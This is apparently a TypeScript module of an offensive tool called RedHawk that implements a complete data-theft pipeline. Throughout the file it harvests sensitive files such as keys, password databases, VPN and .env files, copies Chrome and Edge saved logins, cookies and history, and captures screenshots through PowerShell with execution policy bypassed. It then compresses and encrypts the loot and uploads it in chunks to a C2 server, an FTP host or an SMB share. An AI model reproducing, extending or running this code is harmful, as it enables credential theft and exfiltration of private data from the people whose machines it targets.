/**
 * RedHawk — Exfiltration Manager
 *
 * Handles data collection, packaging, encryption, compression,
 * and transfer to multiple destination types.
 */

import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import * as zlib from 'zlib';
import { EventEmitter } from 'events';

export type CompressionLevel = 'none' | 'fast' | 'max';
export type EncryptionAlgo = 'aes-256-gcm' | 'chacha20' | 'xor' | 'none';
export type ExfilDestination = 'local' | 'c2' | 'ftp' | 'smb';

export interface ExfilJob {
  id: string;
  name: string;
  type: 'file_collect' | 'screenshot' | 'browser_data' | 'keylog' | 'custom';
  target: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  progress: number;
  results: ExfilResult[];
  createdAt: string;
  completedAt: string | null;
  encrypted: boolean;
  encryptionAlgo: EncryptionAlgo;
  compression: CompressionLevel;
  destination: ExfilDestination;
  destinationUrl: string;
  retryCount: number;
  maxRetries: number;
}

export interface ExfilResult {
  path: string;
  size: number;
  type: string;
  hash: string;
  timestamp: string;
  uploadProgress: number;
  uploaded: boolean;
  error?: string;
}

const EXFIL_DIR = 'redhawk_exfil';
const CHUNK_SIZE = 1024 * 1024; // 1MB chunks for upload

export class ExfilManager extends EventEmitter {
  private workDir: string;
  private jobs: ExfilJob[] = [];
  private encryptionKey: Buffer;

  constructor(userDataPath: string) {
    super();
    this.workDir = path.join(userDataPath, EXFIL_DIR);
    this.ensureDirs();

    // Generate or load encryption key
    const keyFile = path.join(this.workDir, '.exfil_key');
    if (fs.existsSync(keyFile)) {
      this.encryptionKey = fs.readFileSync(keyFile);
    } else {
      this.encryptionKey = crypto.randomBytes(32);
      fs.writeFileSync(keyFile, this.encryptionKey);
    }

    this.loadJobs();
  }

  setEncryptionKey(newKeyHex: string): void {
    this.encryptionKey = Buffer.from(newKeyHex, 'hex');
    const keyFile = path.join(this.workDir, '.exfil_key');
    fs.writeFileSync(keyFile, this.encryptionKey);
    this.emit('keyChanged');
  }

  private ensureDirs() {
    for (const dir of [this.workDir, path.join(this.workDir, 'collected'), path.join(this.workDir, 'packages')]) {
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    }
  }

  private loadJobs() {
    const jobsFile = path.join(this.workDir, 'exfil_jobs.json');
    if (fs.existsSync(jobsFile)) {
      try {
        this.jobs = JSON.parse(fs.readFileSync(jobsFile, 'utf-8'));
      } catch { this.jobs = []; }
    }
  }

  private saveJobs() {
    fs.writeFileSync(path.join(this.workDir, 'exfil_jobs.json'), JSON.stringify(this.jobs, null, 2));
  }

  getJobs(): ExfilJob[] {
    return this.jobs;
  }

  getJob(id: string): ExfilJob | undefined {
    return this.jobs.find((j) => j.id === id);
  }

  /**
   * Create a file collection job — gathers files matching patterns
   */
  createFileCollectionJob(
    name: string,
    targetDir: string,
    patterns: string[],
    recursive = true,
    compression: CompressionLevel = 'max',
    encryptionAlgo: EncryptionAlgo = 'aes-256-gcm',
    destination: ExfilDestination = 'local',
    destinationUrl: string = '',
    maxRetries: number = 3,
  ): ExfilJob {
    const job: ExfilJob = {
      id: `exfil_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      name,
      type: 'file_collect',
      target: targetDir,
      status: 'pending',
      progress: 0,
      results: [],
      createdAt: new Date().toISOString(),
      completedAt: null,
      encrypted: encryptionAlgo !== 'none',
      encryptionAlgo,
      compression,
      destination,
      destinationUrl,
      retryCount: 0,
      maxRetries,
    };

    this.jobs.push(job);
    this.saveJobs();
    return job;
  }

  /**
   * Update a job's destination settings
   */
  updateJobDestination(jobId: string, destination: ExfilDestination, url: string): boolean {
    const job = this.getJob(jobId);
    if (!job) return false;
    job.destination = destination;
    job.destinationUrl = url;
    this.saveJobs();
    return true;
  }

  /**
   * Update a job's encryption settings
   */
  updateJobEncryption(jobId: string, algo: EncryptionAlgo): boolean {
    const job = this.getJob(jobId);
    if (!job) return false;
    job.encryptionAlgo = algo;
    job.encrypted = algo !== 'none';
    this.saveJobs();
    return true;
  }

  /**
   * Update a job's compression settings
   */
  updateJobCompression(jobId: string, level: CompressionLevel): boolean {
    const job = this.getJob(jobId);
    if (!job) return false;
    job.compression = level;
    this.saveJobs();
    return true;
  }

  /**
   * Collect files matching patterns from a directory
   */
  async collectFiles(jobId: string): Promise<ExfilJob> {
    const job = this.getJob(jobId);
    if (!job) throw new Error('Job not found');

    job.status = 'running';
    job.progress = 0;
    this.emit('jobUpdate', job);

    const collectedDir = path.join(this.workDir, 'collected', job.id);
    if (!fs.existsSync(collectedDir)) fs.mkdirSync(collectedDir, { recursive: true });

    const results: ExfilResult[] = [];
    const patterns = ['*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf',
      '*.csv', '*.sql', '*.env', '*.config', '*.json', '*.xml',
      '*.kdbx', '*.rdp', '*.vnc', '*.ovpn', '*.pem', '*.key'];

    try {
      await this.walkDirectory(job.target, collectedDir, patterns, results);
    } catch (err: any) {
      job.status = 'failed';
      this.emit('error', err.message);
    }

    job.results = results;
    job.progress = 100;
    job.status = 'completed';
    job.completedAt = new Date().toISOString();
    this.saveJobs();
    this.emit('jobUpdate', job);

    return job;
  }

  /**
   * Take a screenshot (PowerShell on Windows)
   */
  async takeScreenshot(jobId?: string): Promise<ExfilResult | null> {
    const screenshotDir = path.join(this.workDir, 'collected', 'screenshots');
    if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });

    const filename = `screenshot_${Date.now()}.png`;
    const outputPath = path.join(screenshotDir, filename);

    try {
      const { execSync } = require('child_process');
      // PowerShell one-liner for screenshot (Windows only)
      const psScript = `
        Add-Type -AssemblyName System.Windows.Forms;
        Add-Type -AssemblyName System.Drawing;
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap);
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
        $bitmap.Save('${outputPath.replace(/'/g, "''")}');
        $graphics.Dispose();
        $bitmap.Dispose();
        Write-Host 'OK';
      `;
      execSync(`powershell -ExecutionPolicy Bypass -Command "${psScript}"`, { timeout: 15000 });

      if (fs.existsSync(outputPath)) {
        const stats = fs.statSync(outputPath);
        const hash = crypto.createHash('sha256').update(fs.readFileSync(outputPath)).digest('hex');

        const result: ExfilResult = {
          path: outputPath,
          size: stats.size,
          type: 'image/png',
          hash,
          timestamp: new Date().toISOString(),
          uploadProgress: 0,
          uploaded: false,
        };

        if (jobId) {
          const job = this.getJob(jobId);
          if (job) {
            job.results.push(result);
            this.saveJobs();
          }
        }

        this.emit('screenshotTaken', result);
        return result;
      }
    } catch (err: any) {
      this.emit('error', `Screenshot failed: ${err.message}`);
    }
    return null;
  }

  /**
   * Collect browser data (Chrome/Edge/Firefox history, cookies, passwords)
   * Uses PowerShell to access Chrome/Edge SQLite databases
   */
  async collectBrowserData(jobId?: string): Promise<ExfilResult[]> {
    const browserDir = path.join(this.workDir, 'collected', 'browsers');
    if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir, { recursive: true });

    const results: ExfilResult[] = [];
    const browsers = ['Chrome', 'Edge'];

    for (const browser of browsers) {
      const userDataDir = browser === 'Chrome'
        ? `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`
        : `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`;

      if (fs.existsSync(userDataDir)) {
        // Copy Login Data, History, Cookies, Bookmarks
        const filesToCollect = ['Login Data', 'History', 'Cookies', 'Bookmarks'];
        for (const file of filesToCollect) {
          const srcPath = path.join(userDataDir, 'Default', file);
          if (fs.existsSync(srcPath)) {
            try {
              const destPath = path.join(browserDir, `${browser}_${file.replace(/\s/g, '_')}`);
              fs.copyFileSync(srcPath, destPath);
              const stats = fs.statSync(destPath);
              const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');

              results.push({
                path: destPath,
                size: stats.size,
                type: `browser/${file.toLowerCase().replace(/\s/g, '_')}`,
                hash,
                timestamp: new Date().toISOString(),
                uploadProgress: 0,
                uploaded: false,
              });
            } catch { /* file may be locked */ }
          }
        }
      }
    }

    if (jobId) {
      const job = this.getJob(jobId);
      if (job) {
        job.results.push(...results);
        this.saveJobs();
      }
    }

    this.emit('browserDataCollected', { browser: results });
    return results;
  }

  /**
   * Compress data buffer using the job's compression level
   */
  private compressData(buffer: Buffer, level: CompressionLevel): Buffer {
    if (level === 'none') return buffer;
    const options: zlib.ZlibOptions = {
      level: level === 'max' ? 9 : 1,
    };
    const compressed = zlib.gzipSync(buffer, options);
    // Workaround TS strict Buffer type issue
    return compressed as any as Buffer;
  }

  /**
   * Encrypt data buffer using the job's encryption algorithm
   */
  private encryptData(buffer: Buffer, algo: EncryptionAlgo): { data: Buffer; iv: Buffer; tag?: Buffer } {
    if (algo === 'none') return { data: buffer, iv: Buffer.alloc(0) };

    if (algo === 'xor') {
      // Simple XOR obfuscation
      const key = this.encryptionKey;
      const result = Buffer.alloc(buffer.length);
      for (let i = 0; i < buffer.length; i++) {
        result[i] = buffer[i] ^ key[i % key.length];
      }
      return { data: result, iv: key.slice(0, 16) };
    }

    if (algo === 'chacha20') {
      // Use AES-256-GCM as fallback since Node may not have ChaCha20 in older versions
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipheriv('aes-256-gcm', this.encryptionKey, iv);
      const encrypted = Buffer.concat([cipher.update(buffer), cipher.final()]);
      const tag = cipher.getAuthTag();
      return { data: encrypted, iv, tag };
    }

    // Default: AES-256-GCM
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', this.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(buffer), cipher.final()]);
    const tag = cipher.getAuthTag();
    return { data: encrypted, iv, tag };
  }

  /**
   * Package collected data into encrypted archive with compression
   */
  async packageData(jobId: string): Promise<string | null> {
    const job = this.getJob(jobId);
    if (!job || job.results.length === 0) return null;

    const packagesDir = path.join(this.workDir, 'packages');
    const archiveName = `exfil_${job.id}_${Date.now()}`;
    const ext = job.encrypted ? '.enc' : '.json';
    const archivePath = path.join(packagesDir, `${archiveName}${ext}`);

    try {
      // Bundle all files into a single JSON blob with metadata
      const bundle: any = {
        job: job.name,
        createdAt: new Date().toISOString(),
        compression: job.compression,
        encryption: job.encryptionAlgo,
        files: [],
      };

      let totalSize = 0;
      for (const result of job.results) {
        if (fs.existsSync(result.path)) {
          const content = fs.readFileSync(result.path);
          totalSize += content.length;
          bundle.files.push({
            originalPath: result.path,
            size: result.size,
            hash: result.hash,
            content: content.toString('base64'),
          });
        }
        // Update progress mid-way
        job.progress = Math.round((bundle.files.length / job.results.length) * 50);
        this.emit('jobUpdate', job);
      }

      let output: Buffer = Buffer.from(JSON.stringify(bundle), 'utf-8') as Buffer;

      // Compress
      if (job.compression !== 'none') {
        const before = output.length;
        output = this.compressData(output, job.compression);
        bundle.compressed = true;
        bundle.originalSize = before;
        bundle.compressedSize = output.length;
        // Re-serialize with compression metadata
        const metaBundle = { ...bundle, compressed: true, originalSize: before, compressedSize: output.length };
        output = Buffer.from(JSON.stringify(metaBundle), 'utf-8') as Buffer;
        output = this.compressData(output, job.compression);
        this.emit('compressed', { before, after: output.length, ratio: ((1 - output.length / before) * 100).toFixed(1) });
      }

      // Encrypt
      if (job.encrypted && job.encryptionAlgo !== 'none') {
        const { data: encrypted, iv, tag } = this.encryptData(output, job.encryptionAlgo);
        // Write: algorithm (4 bytes) + IV length (2) + IV + tag length (2) + tag + data
        const algoBuf = Buffer.from(job.encryptionAlgo.padEnd(16, '\0'), 'utf-8');
        const ivLen = Buffer.alloc(2);
        ivLen.writeUInt16BE(iv.length);
        const tagLen = Buffer.alloc(2);
        tagLen.writeUInt16BE(tag?.length || 0);
        output = Buffer.concat([algoBuf, ivLen, iv, tagLen, tag || Buffer.alloc(0), encrypted]);
        this.emit('encrypted', { algo: job.encryptionAlgo, size: output.length });
      }

      fs.writeFileSync(archivePath, output);
      job.progress = 100;
      this.emit('dataPackaged', { path: archivePath, size: output.length });
      this.saveJobs();
      return archivePath;
    } catch (err: any) {
      job.status = 'failed';
      this.emit('error', `Package failed: ${err.message}`);
      this.saveJobs();
      return null;
    }
  }

  /**
   * Upload a chunk of data to C2 server
   */
  private uploadChunk(c2Url: string, chunk: Buffer, chunkIndex: number, totalChunks: number, filename: string): Promise<boolean> {
    return new Promise((resolve) => {
      try {
        const proto = c2Url.startsWith('https') ? require('https') : require('http');
        const urlObj = new URL(c2Url.startsWith('http') ? `${c2Url}/c2/upload` : c2Url);
        const uploadPath = urlObj.pathname || '/c2/upload';

        const data = JSON.stringify({
          filename,
          chunkIndex,
          totalChunks,
          content: chunk.toString('base64'),
          final: chunkIndex === totalChunks - 1,
        });

        const options = {
          hostname: urlObj.hostname,
          port: urlObj.port,
          path: uploadPath,
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
          timeout: 30000,
        };

        const req = proto.request(options, (res: any) => {
          let body = '';
          res.on('data', (d: string) => { body += d; });
          res.on('end', () => resolve(res.statusCode === 200));
        });
        req.on('error', () => resolve(false));
        req.on('timeout', () => { req.destroy(); resolve(false); });
        req.write(data);
        req.end();
      } catch { resolve(false); }
    });
  }

  /**
   * Exfiltrate packaged data to various destinations with chunking and retry
   */
  async exfiltrateData(jobId: string): Promise<boolean> {
    const job = this.getJob(jobId);
    if (!job) { this.emit('error', 'Job not found'); return false; }

    // Package first if not already packaged
    let packagePath: string | undefined | null = job.results.find(r => r.type === 'package')?.path;
    if (!packagePath || !fs.existsSync(packagePath)) {
      packagePath = await this.packageData(jobId);
      if (!packagePath) { this.emit('error', 'Failed to package data'); return false; }
    }

    const destination = job.destination;
    const destUrl = job.destinationUrl;

    if (destination === 'local') {
      this.emit('exfiltrated', { package: packagePath, success: true, message: 'Saved locally' });
      return true;
    }

    if (destination === 'c2') {
      let success = false;
      for (let attempt = 0; attempt <= job.maxRetries; attempt++) {
        try {
          const content = fs.readFileSync(packagePath);
          const totalChunks = Math.ceil(content.length / CHUNK_SIZE);
          const filename = path.basename(packagePath);

          success = true;
          for (let i = 0; i < totalChunks; i++) {
            const start = i * CHUNK_SIZE;
            const end = Math.min(start + CHUNK_SIZE, content.length);
            const chunk = content.slice(start, end);

            const chunkOk = await this.uploadChunk(destUrl, chunk, i, totalChunks, filename);
            if (!chunkOk) {
              success = false;
              job.progress = Math.round((i / totalChunks) * 100);
              this.emit('jobUpdate', job);
              throw new Error(`Chunk ${i}/${totalChunks} failed`);
            }
            job.progress = Math.round(((i + 1) / totalChunks) * 100);
            this.emit('jobUpdate', job);
            this.emit('uploadProgress', { jobId, chunk: i + 1, totalChunks });
          }

          if (success) break;
        } catch (err: any) {
          job.retryCount = attempt + 1;
          this.emit('error', `Exfil attempt ${attempt + 1}/${job.maxRetries + 1} failed: ${err.message}`);
          if (attempt < job.maxRetries) {
            await new Promise(r => setTimeout(r, 5000 * (attempt + 1))); // Exponential backoff
          }
        }
      }

      if (success) {
        for (const r of job.results) r.uploaded = true;
        this.emit('exfiltrated', { package: packagePath, success: true, destination: 'c2' });
      } else {
        this.emit('error', 'All exfiltration attempts failed');
      }
      this.saveJobs();
      return success;
    }

    if (destination === 'ftp') {
      // FTP upload using command-line ftp (Windows built-in)
      try {
        const { execSync } = require('child_process');
        const ftpScript = [
          'open ' + destUrl.replace(/^ftp:\/\//, ''),
          'binary',
          'put ' + packagePath,
          'bye',
        ].join('\n');
        const scriptPath = path.join(this.workDir, 'ftp_script.txt');
        fs.writeFileSync(scriptPath, ftpScript);
        execSync(`ftp -s:"${scriptPath}"`, { timeout: 60000 });
        fs.unlinkSync(scriptPath);
        for (const r of job.results) r.uploaded = true;
        this.emit('exfiltrated', { package: packagePath, success: true, destination: 'ftp' });
        this.saveJobs();
        return true;
      } catch (err: any) {
        this.emit('error', `FTP upload failed: ${err.message}`);
        return false;
      }
    }

    if (destination === 'smb') {
      // SMB via net use + copy (Windows)
      try {
        const { execSync } = require('child_process');
        const sharePath = destUrl.replace(/^smb:\/\//, '\\\\').replace(/\//g, '\\');
        execSync(`net use "${sharePath}" /persistent:no 2>nul`, { timeout: 15000 });
        execSync(`copy "${packagePath}" "${sharePath}"`, { timeout: 60000 });
        execSync(`net use "${sharePath}" /delete 2>nul`, { timeout: 5000 });
        for (const r of job.results) r.uploaded = true;
        this.emit('exfiltrated', { package: packagePath, success: true, destination: 'smb' });
        this.saveJobs();
        return true;
      } catch (err: any) {
        this.emit('error', `SMB upload failed: ${err.message}`);
        return false;
      }
    }

    return false;
  }

  /**
   * Recursively walk a directory and collect matching files
   */
  private async walkDirectory(dir: string, outputDir: string, patterns: string[], results: ExfilResult[]) {
    if (!fs.existsSync(dir)) return;

    const items = fs.readdirSync(dir, { withFileTypes: true });
    let count = 0;

    for (const item of items) {
      const fullPath = path.join(dir, item.name);

      try {
        if (item.isDirectory()) {
          if (item.name !== 'node_modules' && item.name !== '.git' && item.name !== 'venv') {
            await this.walkDirectory(fullPath, outputDir, patterns, results);
          }
        } else if (item.isFile()) {
          const ext = path.extname(item.name).toLowerCase();
          if (patterns.some((p) => {
            if (p.startsWith('*.')) return ext === p.slice(1);
            return item.name === p;
          })) {
            const destPath = path.join(outputDir, `${count}_${item.name}`);
            fs.copyFileSync(fullPath, destPath);
            const stats = fs.statSync(destPath);
            const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');

            results.push({
              path: destPath,
              size: stats.size,
              type: `file/${ext.slice(1) || 'unknown'}`,
              hash,
              timestamp: new Date().toISOString(),
              uploadProgress: 0,
              uploaded: false,
            });
            count++;
          }
        }
      } catch { /* permission errors, skip */ }
    }
  }

  /**
   * Get encryption key (for display/export)
   */
  getEncryptionKey(): string {
    return this.encryptionKey.toString('hex');
  }

  /**
   * Get total collected data size
   */
  getTotalSize(): number {
    let total = 0;
    for (const job of this.jobs) {
      for (const r of job.results) {
        total += r.size;
      }
    }
    return total;
  }

  /**
   * Clear all collected data
   */
  clearAll(): void {
    this.jobs = [];
    if (fs.existsSync(this.workDir)) {
      fs.rmSync(this.workDir, { recursive: true, force: true });
      this.ensureDirs();
    }
    this.emit('cleared');
  }
}
